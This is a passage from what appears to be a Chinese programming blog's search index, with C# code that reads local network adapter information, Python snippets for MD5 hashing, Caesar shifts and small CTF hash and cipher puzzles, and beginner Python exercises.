punctuation">)</span><span class="token punctuation">;</span>                Output<span class="token punctuation">(</span>sb, localIPv6<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            catch <span class="token punctuation">(</span>Exception ex<span class="token punctuation">)</span>            <span class="token punctuation">{</span>                Console.WriteLine<span class="token punctuation">(</span><span class="token string">"Error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            Console.WriteLine<span class="token punctuation">(</span>sb.ToString<span class="token punctuation">(</span><span class="token punctuation">))</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        /// <span class="token operator">&lt;</span>summary<span class="token operator">></span>        /// Output        /// <span class="token operator">&lt;</span>/summary<span class="token operator">></span>        /// <span class="token operator">&lt;</span>param name<span class="token operator">=</span><span class="token string">"sb"</span><span class="token operator">></span><span class="token operator">&lt;</span>/param<span class="token operator">></span>        /// <span class="token operator">&lt;</span>param name<span class="token operator">=</span><span class="token string">"localip"</span><span class="token operator">></span><span class="token operator">&lt;</span>/param<span class="token operator">></span>        private static void Output<span class="token punctuation">(</span>StringBuilder sb, IPAddress localip<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            IPEndPoint iep <span class="token operator">=</span> new IPEndPoint<span class="token punctuation">(</span>localip, 80<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>localip.AddressFamily <span class="token operator">==</span> AddressFamily.InterNetworkV6<span class="token punctuation">)</span>            <span class="token punctuation">{</span>                sb.Append<span class="token punctuation">(</span><span class="token string">"IPv6端点： "</span> + iep.ToString<span class="token punctuation">(</span><span class="token punctuation">))</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">else</span>            <span class="token punctuation">{</span>                sb.Append<span class="token punctuation">(</span><span class="token string">"IPv4端点： "</span> + iep.ToString<span class="token punctuation">(</span><span class="token punctuation">))</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            sb.Append<span class="token punctuation">(</span><span class="token string">"，端口 "</span> + iep.Port<span class="token punctuation">)</span><span class="token punctuation">;</span>            sb.Append<span class="token punctuation">(</span><span class="token string">"，地址 "</span> + iep.Address<span class="token punctuation">)</span><span class="token punctuation">;</span>            sb.AppendLine<span class="token punctuation">(</span><span class="token string">"，地址族 "</span> + iep.AddressFamily<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        //获取网络适配器信息        public static void networkAdapterInfo<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            StringBuilder sb <span class="token operator">=</span> new StringBuilder<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            IPGlobalProperties properties <span class="token operator">=</span> IPGlobalProperties.GetIPGlobalProperties<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            IPGlobalStatistics ipstat <span class="token operator">=</span> properties.GetIPv4GlobalStatistics<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            sb.AppendLine<span class="token punctuation">(</span><span class="token string">"本机注册域名： "</span> + properties.DomainName<span class="token punctuation">)</span><span class="token punctuation">;</span>            sb.AppendLine<span class="token punctuation">(</span><span class="token string">"接收数据报数： "</span> + ipstat.ReceivedPackets<span class="token punctuation">)</span><span class="token punctuation">;</span>            sb.AppendLine<span class="token punctuation">(</span><span class="token string">"转发数据包数 : "</span> + ipstat.ReceivedPacketsForwarded<span class="token punctuation">)</span><span class="token punctuation">;</span>            sb.AppendLine<span class="token punctuation">(</span><span class="token string">"传送数据包数 : "</span> + ipstat.ReceivedPacketsDelivered<span class="token punctuation">)</span><span class="token punctuation">;</span>            sb.AppendLine<span class="token punctuation">(</span><span class="token string">"丢弃数据包数 : "</span> + ipstat.ReceivedPacketsDiscarded<span class="token punctuation">)</span><span class="token punctuation">;</span>            Console.WriteLine<span class="token punctuation">(</span>sb.ToString<span class="token punctuation">(</span><span class="token punctuation">))</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        //网络流量统计        public static void networkTrafficStatistics<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            StringBuilder sb <span class="token operator">=</span> new StringBuilder<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            NetworkInterface<span class="token punctuation">[</span><span class="token punctuation">]</span> adapters <span class="token operator">=</span> NetworkInterface.GetAllNetworkInterfaces<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            sb.AppendLine<span class="token punctuation">(</span><span class="token string">"适配器个数： "</span> + adapters.Length<span class="token punctuation">)</span><span class="token punctuation">;</span>            int index <span class="token operator">=</span> 0<span class="token punctuation">;</span>//用于之后显示是第几个网络适配器            foreach  <span class="token punctuation">(</span>NetworkInterface adapter <span class="token keyword">in</span> adapters<span class="token punctuation">)</span>            <span class="token punctuation">{</span>                index++<span class="token punctuation">;</span>                sb.AppendLine<span class="token punctuation">(</span><span class="token string">"\n\n------------第"</span> + index + <span class="token string">"个适配器信息------------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                //显示网络适配器描述信息、名称、类型、速度、MAC地址                sb.AppendLine<span class="token punctuation">(</span><span class="token string">"描述信息： "</span> + adapter.Description<span class="token punctuation">)</span><span class="token punctuation">;</span>                sb.AppendLine<span class="token punctuation">(</span><span class="token string">"名称："</span> + adapter.Name<span class="token punctuation">)</span><span class="token punctuation">;</span>                sb.AppendLine<span class="token punctuation">(</span><span class="token string">"类型："</span> + adapter.NetworkInterfaceType<span class="token punctuation">)</span><span class="token punctuation">;</span>                sb.AppendLine<span class="token punctuation">(</span><span class="token string">"速度："</span> + adapter.Speed/1024/1024 + <span class="token string">" MB/s"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                byte<span class="token punctuation">[</span><span class="token punctuation">]</span> macBytes <span class="token operator">=</span> adapter.GetPhysicalAddress<span class="token punctuation">(</span><span class="token punctuation">)</span>.GetAddressBytes<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                sb.AppendLine<span class="token punctuation">(</span><span class="token string">"MAC地址："</span> + BitConverter.ToString<span class="token punctuation">(</span>macBytes<span class="token punctuation">))</span><span class="token punctuation">;</span>                //获取IPInterfaceProperties实例                IPInterfaceProperties adapterProperties <span class="token operator">=</span> adapter.GetIPProperties<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                //获取并显示DNS服务器地址信息                IPAddressCollection dnsServers <span class="token operator">=</span> adapterProperties.DnsAddresses<span class="token punctuation">;</span>                if<span class="token punctuation">(</span>dnsServers.Count <span class="token operator">></span> 0<span class="token punctuation">)</span>                <span class="token punctuation">{</span>                    foreach <span class="token punctuation">(</span>var dns <span class="token keyword">in</span> dnsServers<span class="token punctuation">)</span>                    <span class="token punctuation">{</span>                        sb.AppendLine<span class="token punctuation">(</span><span class="token string">"DNS服务器IP地址："</span> + dns<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>            Console.WriteLine<span class="token punctuation">(</span>sb.ToString<span class="token punctuation">(</span><span class="token punctuation">))</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        //public static void exit<span class="token punctuation">(</span>object source,ElapsedEventHandler e<span class="token punctuation">)</span>        //<span class="token punctuation">{</span>        //    <span class="token keyword">return</span><span class="token punctuation">;</span>        //<span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Language </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C# </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python加密</title>
      <link href="/2020/03/07/python-jia-mi/"/>
      <url>/2020/03/07/python-jia-mi/</url>
      
        <content type="html"><![CDATA[<h2 id="md5加密"><a href="#md5加密" class="headerlink" title="md5加密"></a>md5加密</h2><pre class=" language-bash"><code class="language-bash"><span class="token function">import</span> hashlib<span class="token comment" spellcheck="true"># 待加密信息</span>str <span class="token operator">=</span> input<span class="token punctuation">(</span><span class="token string">"密文(字符串)："</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 创建md5对象</span>m <span class="token operator">=</span> hashlib.md5<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># Tips</span><span class="token comment" spellcheck="true"># 此处必须encode</span><span class="token comment" spellcheck="true"># 若写法为m.update(str)  报错为： Unicode-objects must be encoded before hashing</span><span class="token comment" spellcheck="true"># 因为python3里默认的str是unicode</span><span class="token comment" spellcheck="true"># 或者 b = bytes(str, encoding='utf-8')，作用相同，都是encode为bytes</span>b <span class="token operator">=</span> str.encode<span class="token punctuation">(</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>m.update<span class="token punctuation">(</span>b<span class="token punctuation">)</span>str_md5 <span class="token operator">=</span> m.hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>print<span class="token punctuation">(</span><span class="token string">'MD5加密前为 ：'</span> + str<span class="token punctuation">)</span>print<span class="token punctuation">(</span><span class="token string">'MD5加密后为 ：'</span> + str_md5<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 另一种写法：b‘’前缀代表的就是bytes</span><span class="token comment" spellcheck="true">#str_md5 = hashlib.md5(b'this is a md5 test.').hexdigest()</span><span class="token comment" spellcheck="true">#print('MD5加密后为 ：' + str_md5)</span></code></pre><h2 id="ASCLL码移位加密"><a href="#ASCLL码移位加密" class="headerlink" title="ASCLL码移位加密"></a>ASCLL码移位加密</h2><pre class=" language-bash"><code class="language-bash">s<span class="token operator">=</span>input<span class="token punctuation">(</span><span class="token string">"密文(字符串类型)："</span><span class="token punctuation">)</span>key <span class="token operator">=</span> eval<span class="token punctuation">(</span>input<span class="token punctuation">(</span><span class="token string">"偏移(int)："</span><span class="token punctuation">))</span>result<span class="token operator">=</span><span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>s<span class="token punctuation">))</span>:    <span class="token keyword">if</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span>.isalpha<span class="token punctuation">(</span><span class="token punctuation">)</span>:        <span class="token keyword">if</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span>.islower<span class="token punctuation">(</span><span class="token punctuation">)</span>:            result+<span class="token operator">=</span>chr<span class="token punctuation">(</span>97+<span class="token punctuation">(</span>ord<span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>-97+key<span class="token punctuation">)</span>%26<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#小写</span>        else:            result+<span class="token operator">=</span>chr<span class="token punctuation">(</span>65+<span class="token punctuation">(</span>ord<span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>-65+key<span class="token punctuation">)</span>%26<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#大写</span>    else:        result+<span class="token operator">=</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span>                               <span class="token comment" spellcheck="true">#字母以外的不变</span>print<span class="token punctuation">(</span>result<span class="token punctuation">)</span></code></pre><h2 id="残缺的哈希"><a href="#残缺的哈希" class="headerlink" title="残缺的哈希"></a>残缺的哈希</h2><pre class=" language-bash"><code class="language-bash">from io <span class="token function">import</span> StringIO<span class="token function">import</span> hashlib<span class="token function">import</span> operator<span class="token function">import</span> base64m <span class="token operator">=</span> hashlib.md5<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#创建md5对象</span>def md5_1<span class="token punctuation">(</span>stra<span class="token punctuation">)</span>:        b <span class="token operator">=</span> stra.encode<span class="token punctuation">(</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>        m.update<span class="token punctuation">(</span>b<span class="token punctuation">)</span>        stra<span class="token operator">=</span>m.hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>        print<span class="token punctuation">(</span>stra<span class="token punctuation">)</span>seed<span class="token operator">=</span><span class="token string">"1234567890abcdefghijklmnoopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"</span> def get_pwd<span class="token punctuation">(</span>str, num<span class="token punctuation">)</span>:          if<span class="token punctuation">(</span>num <span class="token operator">==</span> 1<span class="token punctuation">)</span>:              <span class="token keyword">for</span> x <span class="token keyword">in</span> str:                  yield x          else:              <span class="token keyword">for</span> x <span class="token keyword">in</span> str:                  <span class="token keyword">for</span> y <span class="token keyword">in</span> get_pwd<span class="token punctuation">(</span>str, num-1<span class="token punctuation">)</span>:                    yield x+y                 strKey<span class="token operator">=</span><span class="token string">"1234567890abcdefghijklmnoopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> get_pwd<span class="token punctuation">(</span>strKey,4<span class="token punctuation">)</span>:      stra<span class="token operator">=</span>x    m2 <span class="token operator">=</span> hashlib.md5<span class="token punctuation">(</span><span class="token punctuation">)</span>    m2.update<span class="token punctuation">(</span>stra.encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">))</span>     stra2<span class="token operator">=</span>m2.hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>stra2<span class="token punctuation">[</span>:10<span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">"c2979c7124"</span><span class="token punctuation">)</span>:        print<span class="token punctuation">(</span><span class="token string">"flag{"</span>+stra+<span class="token string">"}"</span><span class="token punctuation">)</span>        md5_1<span class="token punctuation">(</span>stra<span class="token punctuation">)</span>        <span class="token keyword">break</span></code></pre><h2 id="还原大师"><a href="#还原大师" class="headerlink" title="还原大师"></a>还原大师</h2><pre class=" language-bash"><code class="language-bash"><span class="token function">import</span> hashlibstrKey1<span class="token operator">=</span><span class="token string">"ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span> <span class="token keyword">for</span> ch1 <span class="token keyword">in</span> strKey1:    <span class="token keyword">for</span> ch2 <span class="token keyword">in</span> strKey1:        <span class="token keyword">for</span> ch3 <span class="token keyword">in</span> strKey1:            stra<span class="token operator">=</span><span class="token string">"TASC"</span>+ch1+<span class="token string">"O3RJMV"</span>+ch2+<span class="token string">"WDJKX"</span>+ch3+<span class="token string">"ZM"</span>            m2 <span class="token operator">=</span> hashlib.md5<span class="token punctuation">(</span><span class="token punctuation">)</span>            m2.update<span class="token punctuation">(</span>stra.encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">))</span>             stra2<span class="token operator">=</span>m2.hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>.upper<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>stra2<span class="token punctuation">[</span>:4<span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">"E903"</span> and stra2<span class="token punctuation">[</span>7:11<span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">"4DAB"</span><span class="token punctuation">)</span>:                print<span class="token punctuation">(</span>stra<span class="token punctuation">)</span>                print<span class="token punctuation">(</span>stra2<span class="token punctuation">)</span>                <span class="token keyword">break</span></code></pre><h2 id="一张谍报"><a href="#一张谍报" class="headerlink" title="一张谍报"></a>一张谍报</h2><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#-*- coding:gbk -*-</span><span class="token function">import</span> sysreload<span class="token punctuation">(</span>sys<span class="token punctuation">)</span>sys.setdefaultencoding<span class="token punctuation">(</span><span class="token string">'gbk'</span><span class="token punctuation">)</span>strs1 <span class="token operator">=</span> <span class="token string">"今天上午，朝歌区梆子公司决定，在每天三更天不亮免费在各大小区门口设卡为全城提供二次震耳欲聋的敲更提醒，呼吁大家早睡早起，不要因为贪睡断送大好人生，时代的符号是前进。为此，全区老人都蹲在该公司东边树丛合力抵制，不给公司人员放行，场面混乱。李罗鹰住进朝歌区五十年了，人称老鹰头，几年孙子李虎南刚从东北当猎户回来，每月还寄回来几块鼹鼠干。李罗鹰当年遇到的老婆是朝歌一枝花，所以李南虎是长得非常秀气的一个汉子。李罗鹰表示：无论梆子公司做的对错，反正不能打扰他孙子睡觉，子曰：‘睡觉乃人之常情’。梆子公司这是连菩萨睡觉都不放过啊。李南虎表示：梆子公司智商捉急，小心居民猴急跳墙！这三伏天都不给睡觉，这不扯淡么！到了中午人群仍未离散，更有人提议要烧掉这个公司，公司高层似乎恨不得找个洞钻进去。直到治安人员出现才疏散人群归家，但是李南虎仍旧表示爷爷年纪大了，睡不好对身体不好。"</span>strs2 <span class="token operator">=</span> <span class="token string">"喵天上午，汪歌区哞叽公司决定，在每天八哇天不全免费在各大小区门脑设卡为全城提供双次震耳欲聋的敲哇提醒，呼吁大家早睡早起，不要因为贪睡断送大好人生，时代的编号是前进。为此，全区眠人都足在该公司流边草丛合力抵制，不给公司人员放行，场面混乱。李罗鸟住进汪歌区五十年了，人称眠鸟顶，几年孙叽李熬值刚从流北当屁户回来，每月还寄回来几块报信干。李罗鸟当年遇到的眠婆是汪歌一枝花，所以李值熬是长得非常秀气的一个汉叽。李罗鸟表示：无论哞叽公司做的对错，反正不能打扰他孙叽睡觉，叽叶：‘睡觉乃人之常情’。哞叽公司这是连衣服睡觉都不放过啊。李值熬表示：哞叽公司智商捉急，小心居民猴急跳墙！这八伏天都不给睡觉，这不扯淡么！到了中午人群仍未离散，哇有人提议要烧掉这个公司，公司高层似乎恨不得找个洞钻进去。直到治安人员出现才疏散人群归家，但是李值熬仍旧表示爷爷年纪大了，睡不好对身体不好。"</span>strs3 <span class="token operator">=</span> <span class="token string">"喵汪哞叽双哇顶，眠鸟足屁流脑，八哇报信断流脑全叽，眠鸟进北脑上草，八枝遇孙叽，孙叽对熬编叶：值天衣服放鸟捉猴顶。鸟对：北汪罗汉伏熬乱天门。合编放行，卡编扯呼。人离烧草，报信归洞，孙叽找爷爷。"</span>strs1 <span class="token operator">=</span> unicode<span class="token punctuation">(</span>strs1,<span class="token string">"gbk"</span><span class="token punctuation">)</span>strs2 <span class="token operator">=</span> unicode<span class="token punctuation">(</span>strs2,<span class="token string">"gbk"</span><span class="token punctuation">)</span>strs3 <span class="token operator">=</span> unicode<span class="token punctuation">(</span>strs3,<span class="token string">"gbk"</span><span class="token punctuation">)</span>res <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>strs3<span class="token punctuation">))</span>:    <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>strs2<span class="token punctuation">))</span>:        <span class="token keyword">if</span> strs3<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> strs2<span class="token punctuation">[</span>j<span class="token punctuation">]</span>:            res +<span class="token operator">=</span> strs1<span class="token punctuation">[</span>j<span class="token punctuation">]</span>            <span class="token keyword">break</span>print res</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> 密码学-CTF-Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python</title>
      <link href="/2020/03/07/python/"/>
      <url>/2020/03/07/python/</url>
      
        <content type="html"><![CDATA[<h2 id="核桃的数量"><a href="#核桃的数量" class="headerlink" title="核桃的数量"></a>核桃的数量</h2><pre class=" language-bash"><code class="language-bash">a,b,c<span class="token operator">=</span>map<span class="token punctuation">(</span>int,input<span class="token punctuation">(</span><span class="token punctuation">)</span>.split<span class="token punctuation">(</span><span class="token punctuation">))</span>def duan<span class="token punctuation">(</span>a,b,c<span class="token punctuation">)</span>:    n<span class="token operator">=</span>1    <span class="token keyword">while</span> True:        <span class="token keyword">if</span> n%a<span class="token operator">==</span>0 and n%b<span class="token operator">==</span>0 and n%c<span class="token operator">==</span>0:            <span class="token keyword">return</span> n        else:            n+<span class="token operator">=</span>1print<span class="token punctuation">(</span>duan<span class="token punctuation">(</span>a,b,c<span class="token punctuation">))</span></code></pre><h2 id="质因数"><a href="#质因数" class="headerlink" title="质因数"></a>质因数</h2><pre class=" language-bash"><code class="language-bash">lst<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>n <span class="token operator">=</span> eval<span class="token punctuation">(</span>input<span class="token punctuation">(</span><span class="token punctuation">))</span>def isPrime<span class="token punctuation">(</span>n<span class="token punctuation">)</span>:    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>2,int<span class="token punctuation">(</span>pow<span class="token punctuation">(</span>n,0.5<span class="token punctuation">))</span>+1<span class="token punctuation">)</span>:        <span class="token keyword">if</span> n%i<span class="token operator">==</span>0:            <span class="token keyword">return</span> False    <span class="token keyword">return</span> Truestart<span class="token operator">=</span>2end<span class="token operator">=</span>n<span class="token keyword">while</span> True:    <span class="token keyword">if</span> n%start<span class="token operator">==</span>0 and isPrime<span class="token punctuation">(</span>start<span class="token punctuation">)</span>:        lst.append<span class="token punctuation">(</span>start<span class="token punctuation">)</span>        n/<span class="token operator">=</span>start    <span class="token keyword">if</span> n%start<span class="token operator">!=</span>0:        start+<span class="token operator">=</span>1    <span class="token keyword">if</span> start<span class="token operator">==</span>end:        <span class="token keyword">break</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>0,len<span class="token punctuation">(</span>lst<span class="token punctuation">))</span>:    <span class="token keyword">if</span> i<span class="token operator">==</span><span class="token punctuation">(</span>len<span class="token punctuation">(</span>lst<span class="token punctuation">)</span>-1<span class="token punctuation">)</span>:        print<span class="token punctuation">(</span>lst<span class="token punctuation">[</span>i<span class="token punctuation">]</span>,end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>    else:        print<span class="token punctuation">(</span>lst<span class="token punctuation">[</span>i<span class="token punctuation">]</span>,end<span class="token operator">=</span><span class="token string">" "</span><span class="token punctuation">)</span>print<span class="token punctuation">(</span><span class="token punctuation">)</span>print<span class="token punctuation">(</span>len<span class="token punctuation">(</span>lst<span class="token punctuation">))</span></code></pre><h2 id="前十名"><a href="#前十名" class="headerlink" title="前十名"></a>前十名</h2><pre class=" language-bash"><code class="language-bash">n<span class="token operator">=</span>eval<span class="token punctuation">(</span>input<span class="token punctuation">(</span><span class="token punctuation">))</span>s<span class="token operator">=</span>input<span class="token punctuation">(</span><span class="token punctuation">)</span>items <span class="token operator">=</span> s.split<span class="token punctuation">(</span><span class="token punctuation">)</span>lst<span class="token operator">=</span><span class="token punctuation">[</span>eval<span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> items<span class="token punctuation">]</span>lst.sort<span class="token punctuation">(</span><span class="token punctuation">)</span>lst.reverse<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>0,10<span class="token punctuation">)</span>:    print<span class="token punctuation">(</span>lst<span class="token punctuation">[</span>i<span class="token punctuation">]</span>,end<span class="token operator">=</span><span class="token string">' '</span><span class="token punctuation">)</span></code></pre><h2 id="简单的数列排序"><a href="#简单的数列排序" class="headerlink" title="简单的数列排序"></a>简单的数列排序</h2><pre class=" language-bash"><code class="language-bash">n<span class="token operator">=</span>eval<span class="token punctuation">(</span>input<span class="token punctuation">(</span><span class="token punctuation">))</span>duan<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>str <span class="token operator">=</span> input<span class="token punctuation">(</span><span class="token punctuation">)</span>items <span class="token operator">=</span> str.split<span class="token punctuation">(</span><span class="token punctuation">)</span>duan <span class="token operator">=</span> <span class="token punctuation">[</span>eval<span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> items<span class="token punctuation">]</span>        <span class="token comment" spellcheck="true">#在同一行获取多个输入</span>duan.sort<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>n<span class="token punctuation">)</span>:    print<span class="token punctuation">(</span>duan<span class="token punctuation">[</span>i<span class="token punctuation">]</span>,end<span class="token operator">=</span><span class="token string">" "</span><span class="token punctuation">)</span></code></pre><h2 id="十六进制到八进制的转换"><a href="#十六进制到八进制的转换" class="headerlink" title="十六进制到八进制的转换"></a>十六进制到八进制的转换</h2><pre class=" language-bash"><code class="language-bash">n <span class="token operator">=</span> eval<span class="token punctuation">(</span>input<span class="token punctuation">(</span><span class="token punctuation">))</span>duan <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>0,n<span class="token punctuation">)</span>:    qiao<span class="token operator">=</span> input<span class="token punctuation">(</span><span class="token punctuation">)</span>    duan.append<span class="token punctuation">(</span>qiao<span class="token punctuation">)</span>def hex_dec_oct<span class="token punctuation">(</span>str2<span class="token punctuation">)</span>:                                                                                                                                                                                                                             i <span class="token operator">=</span> int<span class="token punctuation">(</span>str2,16<span class="token punctuation">)</span>    dq<span class="token operator">=</span>str<span class="token punctuation">(</span>oct<span class="token punctuation">(</span>i<span class="token punctuation">))</span>    <span class="token keyword">return</span> dq<span class="token punctuation">[</span>2:-1<span class="token punctuation">]</span>+dq<span class="token punctuation">[</span>len<span class="token punctuation">(</span>dq<span class="token punctuation">)</span>-1<span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>n<span class="token punctuation">)</span>:    qiao<span class="token operator">=</span>str<span class="token punctuation">(</span>duan<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>    print<span class="token punctuation">(</span>hex_dec_oct<span class="token punctuation">(</span>qiao<span class="token punctuation">))</span></code></pre><h2 id="十六进制到十进制的转换"><a href="#十六进制到十进制的转换" class="headerlink" title="十六进制到十进制的转换"></a>十六进制到十进制的转换</h2><pre class=" language-bash"><code class="language-bash">n <span class="token operator">=</span> input<span class="token punctuation">(</span><span class="token punctuation">)</span>def hex_dec<span class="token punctuation">(</span>str1<span class="token punctuation">)</span>:    i<span class="token operator">=</span> int<span class="token punctuation">(</span>str1,16<span class="token punctuation">)</span>    <span class="token keyword">return</span> iprint<span class="token punctuation">(</span>hex_dec<span class="token punctuation">(</span>n<span class="token punctuation">))</span><span class="token comment" spellcheck="true">#十进制到十六进制的转换</span>str1 <span class="token operator">=</span> eval<span class="token punctuation">(</span>input<span class="token punctuation">(</span><span class="token punctuation">))</span>def dec_hex<span class="token punctuation">(</span>str1<span class="token punctuation">)</span>:    result<span class="token operator">=</span>hex<span class="token punctuation">(</span>str1<span class="token punctuation">)</span>    result<span class="token operator">=</span>result.upper<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> result<span class="token punctuation">[</span>2:-1<span class="token punctuation">]</span>+result<span class="token punctuation">[</span>len<span class="token punctuation">(</span>result<span class="token punctuation">)</span>-1<span class="token punctuation">]</span>print<span class="token punctuation">(</span>dec_hex<span class="token punctuation">(</span>str1<span class="token punctuation">))</span></code></pre><h2 id="最长字符串"><a href="#最长字符串" class="headerlink" title="最长字符串"></a>最长字符串</h2><pre class=" language-bash"><code class="language-bash">duan <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>item <span class="token operator">=</span> input<span class="token punctuation">(</span><span class="token punctuation">)</span>.split<span class="token punctuation">(</span><span class="token punctuation">)</span>duan <span class="token operator">=</span> <span class="token punctuation">[</span>x <span class="token keyword">for</span> x <span class="token keyword">in</span> item<span class="token punctuation">]</span>str<span class="token operator">=</span>duan<span class="token punctuation">[</span>0<span class="token punctuation">]</span>max<span class="token operator">=</span>len<span class="token punctuation">(</span>duan<span class="token punctuation">[</span>0<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>1,5<span class="token punctuation">)</span>:    <span class="token keyword">if</span> max <span class="token operator">&lt;</span> len<span class="token punctuation">(</span>duan<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>:        max <span class="token operator">=</span> len<span class="token punctuation">(</span>duan<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>        str <span class="token operator">=</span> duan<span class="token punctuation">[</span>i<span class="token punctuation">]</span>print<span class="token punctuation">(</span>str<span class="token punctuation">)</span></code></pre><h2 id="求大数的质因数"><a href="#求大数的质因数" class="headerlink" title="求大数的质因数"></a>求大数的质因数</h2><pre class=" language-bash"><code class="language-bash">n<span class="token operator">=</span>int<span class="token punctuation">(</span>input<span class="token punctuation">(</span><span class="token string">"请输入正整数："</span><span class="token punctuation">))</span>prime<span class="token operator">=</span>int<span class="token punctuation">(</span>2<span class="token punctuation">)</span><span class="token 